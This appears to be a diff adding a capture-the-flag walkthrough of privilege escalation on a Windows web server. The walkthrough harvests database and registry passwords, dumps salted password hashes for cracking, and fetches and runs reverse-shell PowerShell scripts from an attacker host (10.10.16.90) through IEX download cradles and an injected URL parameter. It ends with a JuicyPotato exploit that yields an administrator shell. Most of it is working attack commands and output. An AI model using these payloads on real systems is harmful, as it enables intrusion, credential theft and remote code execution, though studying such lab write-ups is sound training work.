@@ -1,0 +1,129 @@
+1. After getting the initial shell
+2. Navigating to another directory C:\inetpub\wwwroot\internal-01\simple_chat\includes\dbconnect.php
+3. This contains the DB Config files
+4. Here we can find another password for "harvey" user "!IC4nB3Th3B3st?"
+We got another password eariler "potter" during the enumeration phase
+5. Using below command to connect with database and list the tables present
+
+mysql -uharvey -p!IC4nB3Th3B3st? -e "show tables;" internal_chat //below output
+
+Tables_in_internal_chat
+message
+user
+
+mysql -uharvey -p!IC4nB3Th3B3st? -e "select * from user;" internal_chat //below output
+
+We have below set of users 
+
+uid	uname	passwd
+1	harvey	faeff13072fffdb78ec3b08427678f18295ee28b8b0befc63eea2135eee85df3
+2	bobby	e15929d8ce341f2dfa07ac7a0b6f32379e43868631f2aebc05a3a97b235d6dcc
+3	daniel	f7dbfae1e05efda233b872e9b7f709d3a0f1b042813be01d7e5b9e9788c67c801
+
+open file validation_func.php in the same directory
+
+we can find a function validate_password:
+
+$salt = '8h@tr-waswe_aT#9TaCHuPhU'; //for security reasons please replace this string with your own random string (before attempt to register any user)
+	return hash('sha256', $passwd.$salt); //return sha256 hash of the salted password
+
+We found the salt value and password returns with hash sha256
+
+Now we goto hashcat to crack the password
+
+create below content as input file sha256.hash and run against hashcat
+faeff13072fffdb78ec3b08427678f18295ee28b8b0befc63eea2135eee85df3:8h@tr-waswe_aT#9TaCHuPhU
+e15929d8ce341f2dfa07ac7a0b6f32379e43868631f2aebc05a3a97b235d6dcc:8h@tr-waswe_aT#9TaCHuPhU
+f7dbfae1e05efda233b872e9b7f709d3a0f1b042813be01d7e5b9e9788c7c801:8h@tr-waswe_aT#9TaCHuPhU
+
+
+Hashcat and Johntheripper has issues, we will figure out lateron, but already we know
+the 2 passwords for the user 1. Password1, 2. potter
+
+6. Check information of harvey user using "net user h.potter" command
+
+This user has below permissions enabled
+
+Local Group Memberships      *PowerShell Session Us*Remote Management Use
+                             *Users  
+User is member of Remote Management user group, it is possible to do powershell remoting
+va WinRM (windows remote)
+
+WinRM has TCP port, lets check if it is listening, use command "netstat -ano"
+we are getting multiple list of TCP ports
+
+7. Try executing "powershell.exe" followed by adding the h.potter user's credentials
+it fails, so we are adding list of commands to automate user login using below commandlist
+
+PS C:\inetpub\wwwroot\internal-01\log> $username = 'BART\h.potter' 
+PS C:\inetpub\wwwroot\internal-01\log> $securePassword = ConvertTo-SecureString -AsPlainText -Force 'Password1'
+PS C:\inetpub\wwwroot\internal-01\log> $credential = New-Object System.Management.Automation.PSCredential $username, $securePassword 
+PS C:\inetpub\wwwroot\internal-01\log> Enter-PSSession -ComputerName localhost -Credential $credential
+
+8. Now we need to check if we the userlevel shell for h.potter , this gives an error message
+
+9. We go back to reverse netcat shell and check if system OS is 64bit and Process is 64bit
+[enviroment]::Is64BitOperatingSystem --> True
+[enviroment]::Is64BitProcess --> false
+
+10. In 64-bit "SysNative" powershell must be present, inorder to access that
+add below reverse shell path to existing shell code in burp-suite
+
+?cmd=C:\Windows\SysNative\WindowsPowershell\v1.0\Powershell+"IEX(New-Object+Net.WebClient).downloadString('http%3a//10.10.16.90%3a5555/shell.ps1')" 
+
+Now we get a shell and try same command [enviroment]::Is64BitProcess --> True.
+Now sysnavie is enabled.
+
+Also we need to transfer PowerUp.ps1 from Kali to target, 
+We can download script from https://github.com/PowerShellEmpire/PowerTools/blob/master/PowerUp/PowerUp.ps1
+
+This doesn't work in our machine, during file transter we are getting code level errors
+
+11. Now we need to execute a registry query that outputs Default Password of admin
+
+REG QUERY "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\WinLogon" /v DefaultPassword /reg:64
+
+DefaultPassword: 3130438f31186fbaf962f407711faddb
+
+// We are unable to execute the commands using credential auto login, so we
+move on to using juicy potato exploit
+
+12. Now get the list of files and explots
+     i. juicypotato.exe
+     ii. adminshell.bat containts below code, makesure python file transfer is active on 
+         8000 and shell1.php has port 9001 at the bottom
+
+powershell "IEX(New-Object Net.WebClient).downloadString('http://10.10.16.90:8000/shell1.ps1')"
+
+     These are 2 exploit codes we need to send to the server
+
+ 13.   Use this code for file transfer "powershell -c Invoke-WebRequest -Uri http://10.10.16.90:8000/Filename.format -outFile fname.format"
+       It worked well for file transfer
+
+ 14. now execute juicypotato.exe in target,
+
+    ./jp.exe -t * -p shell.bat -l 4444 -c "{7A6D9C0A-1E7A-41B6-82B4-C3F7A27BA381}"
+
+15. Listen to port 9001, as per code shell.ps1, make sure python server is listenting at 8000
+
+16. Now we got adminshell
+
+17. {7A6D9C0A-1E7A-41B6-82B4-C3F7A27BA381} -> windows 10 Pro CLSID as that worked
+the default CLSID not worked
+
+find the list of CLSID here -> https://github.com/ohpe/juicy-potato/tree/master/CLSID/Windows_10_Pro
+
+4444 represent a mandatory value, and any port can be used here 
+
+
+
+
+
+
+
+
+
+
+
+
+
